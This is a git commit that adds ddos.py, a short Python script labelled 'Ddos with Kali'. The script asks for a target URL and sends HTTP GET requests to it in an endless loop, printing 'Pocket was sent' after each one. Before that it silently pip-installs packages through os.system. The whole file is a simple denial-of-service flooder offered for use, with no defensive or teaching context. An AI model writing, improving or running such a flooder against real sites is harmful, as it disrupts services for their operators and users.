65d3106fef454070bdb822781d25f0b100bf4ca7
Zone-Py <40041432+ZonePy@users.noreply.github.com>
2018-07-14 02:52:17 +0430

    Create ddos.py

---
+++ ddos.py
@@ -0,0 +1,22 @@
+import os
+
+os.system('pip install termcolor && pip install colored && clear')
+import termcolor
+from termcolor import colored
+
+print(colored("**********************",'blue'))
+print(colored("*                    *",'blue'))
+print(colored("*   Ddos with Kali   *",'blue'))
+print(colored("*                    *",'blue'))
+print(colored("**********************",'blue'))
+print(colored("----------------------",'blue'))
+
+import requests
+def dos():
+
+        s = input("enter your target\n example: http://site.ir\n~> ")
+
+        while True:
+            r = requests.get(s)
+            print("Pocket was sent")
+dos()
